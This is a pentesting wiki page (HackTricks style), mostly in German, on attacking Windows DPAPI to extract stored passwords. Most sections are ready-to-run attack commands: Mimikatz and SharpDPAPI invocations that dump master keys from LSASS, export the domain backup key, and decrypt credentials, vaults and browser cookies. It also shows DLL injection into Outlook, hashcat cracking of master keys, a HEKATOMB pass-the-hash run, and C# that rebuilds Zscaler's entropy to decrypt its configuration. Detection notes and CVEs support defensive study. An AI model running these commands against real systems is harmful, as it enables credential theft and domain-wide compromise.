# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## Was ist DPAPI

Die Data Protection API (DPAPI) wird primär im Windows-Betriebssystem zur **symmetrischen Verschlüsselung asymmetrischer privater Schlüssel** verwendet und nutzt dabei entweder Benutzer- oder Systemgeheimnisse als bedeutende Entropiequelle. Dieser Ansatz vereinfacht die Verschlüsselung für Entwickler, indem er ihnen erlaubt, Daten mit einem Schlüssel zu verschlüsseln, der aus den Anmeldegeheimnissen des Benutzers oder — für Systemverschlüsselung — aus den Domain-Authentifizierungsgeheimnissen des Systems abgeleitet ist. Dadurch müssen Entwickler die Sicherung des Verschlüsselungsschlüssels nicht selbst verwalten.

Die gebräuchlichste Art, DPAPI zu verwenden, ist über die **`CryptProtectData` und `CryptUnprotectData`**-Funktionen, die Anwendungen erlauben, Daten sicher mit der Session des aktuell angemeldeten Prozesses zu verschlüsseln und zu entschlüsseln. Das bedeutet, dass die verschlüsselten Daten nur vom selben Benutzer oder System entschlüsselt werden können, das sie verschlüsselt hat.

Außerdem akzeptieren diese Funktionen auch einen **`entropy` parameter**, der bei der Verschlüsselung und Entschlüsselung verwendet wird. Um also etwas zu entschlüsseln, das mit diesem Parameter verschlüsselt wurde, muss derselbe Entropiewert angegeben werden, der bei der Verschlüsselung verwendet wurde.

### Generierung des Benutzerschlüssels

DPAPI erzeugt einen eindeutigen Schlüssel (genannt **`pre-key`**) für jeden Benutzer basierend auf dessen Anmeldedaten. Dieser Schlüssel wird aus dem Benutzerpasswort und anderen Faktoren abgeleitet; der Algorithmus hängt vom Benutzertyp ab, führt aber letztlich zu einem SHA1-Wert. Zum Beispiel hängt es bei Domain-Benutzern **vom NTLM hash des Benutzers** ab.

Das ist besonders interessant, weil ein Angreifer, der den Passwort-Hash eines Benutzers erlangt, Folgendes tun kann:

- **Jegliche Daten entschlüsseln, die mit DPAPI** unter Verwendung dieses Benutzer-Schlüssels verschlüsselt wurden, ohne eine API aufrufen zu müssen
- Versuch, das Passwort offline zu **knacken**, indem er versucht, den gültigen DPAPI-Schlüssel zu generieren

Zudem wird jedes Mal, wenn ein Benutzer Daten mit DPAPI verschlüsselt, ein neuer **Master-Key** erzeugt. Dieser Master-Key ist derjenige, der tatsächlich zur Verschlüsselung der Daten verwendet wird. Jeder Master-Key erhält eine **GUID** (Globally Unique Identifier), die ihn identifiziert.

Die Master-Keys werden im Verzeichnis **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** gespeichert, wobei `{SID}` der Security Identifier dieses Benutzers ist. Der Master-Key wird verschlüsselt durch den `pre-key` des Benutzers und zusätzlich durch einen **domain backup key** zur Wiederherstellung (d.h. derselbe Schlüssel wird auf zwei verschiedene Arten verschlüsselt und gespeichert).

Beachte, dass der **Domain-Schlüssel, der zur Verschlüsselung des Master-Keys verwendet wird, auf den domain controllers liegt und sich niemals ändert**. Wenn ein Angreifer Zugriff auf den Domain-Controller hat, kann er den Domain-Backup-Key abrufen und die Master-Keys aller Benutzer in der Domain entschlüsseln.

Die verschlüsselten Blobs enthalten die **GUID des Master-Keys**, der zur Verschlüsselung der darin enthaltenen Daten verwendet wurde, in ihren Headern.

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

Master-Keys finden:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Machine/System key generation

This is key used for the machine to encrypt data. It's based on the **DPAPI_SYSTEM LSA secret**, which is a special key that only the SYSTEM user can access. This key is used to encrypt data that needs to be accessible by the system itself, such as machine-level credentials or system-wide secrets.

Note that these keys **don't have a domain backup** so they are only accesisble locally:

- **Mimikatz** can access it dumping LSA secrets using the command: `mimikatz lsadump::secrets`
- The secret is stored inside the registry, so an administrator could **modify the DACL permissions to access it**. The registry path is: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### Protected Data by DPAPI

Among the personal data protected by DPAPI are:

- Windows creds
- Internet Explorer and Google Chrome's passwords and auto-completion data
- E-mail and internal FTP account passwords for applications like Outlook and Windows Mail
- Passwords for shared folders, resources, wireless networks, and Windows Vault, including encryption keys
- Passwords for remote desktop connections, .NET Passport, and private keys for various encryption and authentication purposes
- Network passwords managed by Credential Manager and personal data in applications using CryptProtectData, such as Skype, MSN messenger, and more
- Encrypted blobs inside the register
- ...

System protected data includes:
- Wifi passwords
- Scheduled task passwords
- ...

### Master key extraction options

- If the user has domain admin privileges, they can access the **domain backup key** to decrypt all user master keys in the domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Mit lokalen Admin-Rechten ist es möglich, **auf den LSASS memory zuzugreifen**, um die DPAPI master keys aller angemeldeten Benutzer und den SYSTEM key zu extrahieren.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Wenn der Benutzer local admin privileges hat, kann er auf das **DPAPI_SYSTEM LSA secret** zugreifen, um die machine master keys zu entschlüsseln:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Wenn das Passwort oder der NTLM-Hash des Benutzers bekannt ist, können Sie **die master keys des Benutzers direkt entschlüsseln**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Wenn du dich in einer Sitzung als Benutzer befindest, kannst du den DC per RPC nach dem **Backup-Key zum Entschlüsseln der Master-Keys** fragen. Wenn du local admin bist und der Benutzer eingeloggt ist, könntest du dafür seinen **session token** stehlen:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vault auflisten
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Zugriff auf DPAPI-verschlüsselte Daten

### DPAPI-verschlüsselte Daten finden

Häufig geschützte Dateien von Benutzern befinden sich in:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Prüfe auch, ob in den obigen Pfaden `\Roaming\` durch `\Local\` ersetzt wurde.

Enumeration examples:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) kann DPAPI-verschlüsselte Blobs im Dateisystem, in der Registry und in B64 blobs finden:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Beachte, dass [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (aus demselben Repo) verwendet werden kann, um mit DPAPI verschlüsselte sensible Daten wie Cookies zu entschlüsseln.

### Zugriffsschlüssel und Daten

- **Verwende SharpDPAPI**, um Anmeldeinformationen aus mit DPAPI verschlüsselten Dateien der aktuellen Sitzung zu erhalten:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Anmeldeinformationen abrufen** wie die verschlüsselten Daten und den guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Entschlüssle einen masterkey eines Benutzers, der den **domain backup key** anfordert, mittels RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Das Tool **SharpDPAPI** unterstützt außerdem diese Argumente zur Entschlüsselung von Masterkeys (beachte, dass es möglich ist, `/rpc` zu verwenden, um den Domain-Backup-Schlüssel zu erhalten, `/password`, um ein Klartext-Passwort zu verwenden, oder `/pvk`, um eine DPAPI-Domain-Private-Key-Datei anzugeben...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Daten mit einem Masterkey entschlüsseln**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Das Tool **SharpDPAPI** unterstützt außerdem diese Argumente für die Entschlüsselung von `credentials|vaults|rdg|keepass|triage|blob|ps` (beachte, dass es möglich ist, `/rpc` zu verwenden, um den Domain-Backup-Schlüssel zu erhalten, `/password`, um ein Klartextpasswort zu verwenden, `/pvk`, um eine DPAPI domain private key file anzugeben, `/unprotect`, um die aktuelle Benutzersitzung zu verwenden...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Daten mit der **aktuellen Benutzersitzung** entschlüsseln:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Umgang mit optionaler Entropie ("Third-party entropy")

Einige Anwendungen übergeben einen zusätzlichen **Entropie**-Wert an `CryptProtectData`. Ohne diesen Wert kann der Blob nicht entschlüsselt werden, selbst wenn der richtige masterkey bekannt ist. Das Beschaffen der Entropie ist daher essenziell, wenn man auf auf diese Weise geschützte Zugangsdaten abzielt (z. B. Microsoft Outlook, einige VPN-Clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) ist eine user-mode DLL, die die DPAPI-Funktionen im Zielprozess hookt und dabei transparent jegliche optionale Entropie aufzeichnet, die übergeben wird. Das Ausführen von EntropyCapture im **DLL-injection**-Modus gegen Prozesse wie `outlook.exe` oder `vpnclient.exe` erzeugt eine Datei, die jeden Entropie-Puffer dem aufrufenden Prozess und dem Blob zuordnet. Die erfasste Entropie kann später an **SharpDPAPI** (`/entropy:`) oder **Mimikatz** (`/entropy:<file>`) übergeben werden, um die Daten zu entschlüsseln.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Masterkeys offline knacken (Hashcat & DPAPISnoop)

Microsoft führte ab Windows 10 v1607 (2016) ein **context 3** Masterkey-Format ein. `hashcat` v6.2.6 (Dezember 2023) ergänzte die hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) und **22102** (context 3), die GPU-beschleunigtes Knacken von Benutzerpasswörtern direkt aus der Masterkey-Datei ermöglichen. Angreifer können dadurch Wörterbuch- oder Brute-Force-Angriffe durchführen, ohne mit dem Zielsystem zu interagieren.

`DPAPISnoop` (2024) automatisiert den Prozess:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Das Tool kann außerdem Credential and Vault blobs parsen, sie mit cracked keys entschlüsseln und cleartext passwords exportieren.

### Zugriff auf Daten anderer Maschinen

In **SharpDPAPI and SharpChrome** können Sie die Option **`/server:HOST`** angeben, um auf die Daten einer entfernten Maschine zuzugreifen. Natürlich müssen Sie Zugriff auf diese Maschine haben, und im folgenden Beispiel wird angenommen, dass der **Domain-Backup-Verschlüsselungsschlüssel bekannt ist**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Weitere Tools

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ist ein Tool, das die Extraktion aller Benutzer und Computer aus dem LDAP-Verzeichnis sowie die Extraktion des Domain-Controller-Backup-Schlüssels über RPC automatisiert. Das Skript löst dann die IP-Adressen aller Computer auf und führt einen smbclient auf allen Computern aus, um alle DPAPI-Blobs aller Benutzer abzurufen und alles mit dem Domain-Backup-Schlüssel zu entschlüsseln.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Mit der aus LDAP extrahierten Computerliste kannst du jedes Subnetz finden, auch wenn du davon nichts wusstest!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) kann automatisch durch DPAPI geschützte Geheimnisse extrahieren. Das 2.x-Release führte ein:

* Parallele Sammlung von Blobs von Hunderten Hosts
* Parsen von **context 3** masterkeys und automatische Hashcat-Cracking-Integration
* Unterstützung für Chrome "App-Bound" verschlüsselte Cookies (siehe nächsten Abschnitt)
* Einen neuen **`--snapshot`**-Modus, um Endpunkte wiederholt zu pollen und neu erstellte Blobs zu diffen

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) ist ein C#-Parser für masterkey/credential/vault-Dateien, der Hashcat-/JtR-Formate ausgeben und optional Cracking automatisch starten kann. Es unterstützt vollständig Machine- und User-Masterkey-Formate bis Windows 11 24H1.


## Häufige Erkennungen

- Zugriff auf Dateien in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` und anderen DPAPI-bezogenen Verzeichnissen.
- Besonders von einem Netzwerkshare wie **C$** oder **ADMIN$**.
- Einsatz von **Mimikatz**, **SharpDPAPI** oder ähnlichen Tools, um auf den LSASS-Speicher zuzugreifen oder Masterkeys zu dumpen.
- Ereignis **4662**: *An operation was performed on an object* – kann mit dem Zugriff auf das **`BCKUPKEY`**-Objekt korreliert werden.
- Ereignis **4673/4674**, wenn ein Prozess *SeTrustedCredManAccessPrivilege* anfordert (Credential Manager)

---
### 2023–2025 Schwachstellen & Änderungen im Ökosystem

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Ein Angreifer mit Netzwerkzugang konnte ein Domänenmitglied dazu bringen, einen bösartigen DPAPI-Backup-Schlüssel abzurufen, was die Entschlüsselung von Benutzer-Masterkeys erlaubte. Im kumulativen Update vom November 2023 gepatcht – Administratoren sollten sicherstellen, dass DCs und Workstations vollständig gepatcht sind.
* **Chrome 127 “App-Bound” cookie encryption** (Juli 2024) ersetzte den alten nur-DPAPI-Schutz durch einen zusätzlichen Schlüssel, der im Benutzer-**Credential Manager** gespeichert wird. Die Offline-Entschlüsselung von Cookies erfordert jetzt sowohl den DPAPI-Masterkey als auch den **GCM-wrapped app-bound key**. SharpChrome v2.3 und DonPAPI 2.x sind in der Lage, den zusätzlichen Schlüssel wiederherzustellen, wenn sie im Benutzerkontext ausgeführt werden.


### Fallstudie: Zscaler Client Connector – benutzerdefinierte Entropie, abgeleitet von der SID

Zscaler Client Connector speichert mehrere Konfigurationsdateien unter `C:\ProgramData\Zscaler` (z. B. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Jede Datei ist mit **DPAPI (Machine scope)** verschlüsselt, aber der Anbieter liefert eine **benutzerdefinierte Entropie**, die *zur Laufzeit berechnet* wird, anstatt auf der Festplatte gespeichert zu werden.

Die Entropie wird aus zwei Elementen rekonstruiert:

1. Ein festkodiertes Geheimnis, eingebettet in `ZSACredentialProvider.dll`.
2. Die **SID** des Windows-Kontos, zu dem die Konfiguration gehört.

Der von der DLL implementierte Algorithmus ist äquivalent zu:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Da das Geheimnis in einer DLL eingebettet ist, die von der Festplatte gelesen werden kann, **kann jeder lokale Angreifer mit SYSTEM-Rechten die Entropie für jede SID regenerieren** und die Blobs offline entschlüsseln:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Die Entschlüsselung liefert die vollständige JSON-Konfiguration, einschließlich jeder **device posture check** und ihres erwarteten Werts – Informationen, die beim Versuch von client-side bypasses sehr wertvoll sind.

> TIPP: die anderen verschlüsselten Artefakte (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) sind mit DPAPI **ohne** entropy (`16` zero bytes) geschützt. Sie können daher direkt mit `ProtectedData.Unprotect` entschlüsselt werden, sobald SYSTEM-Privilegien erlangt wurden.

## Quellen

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
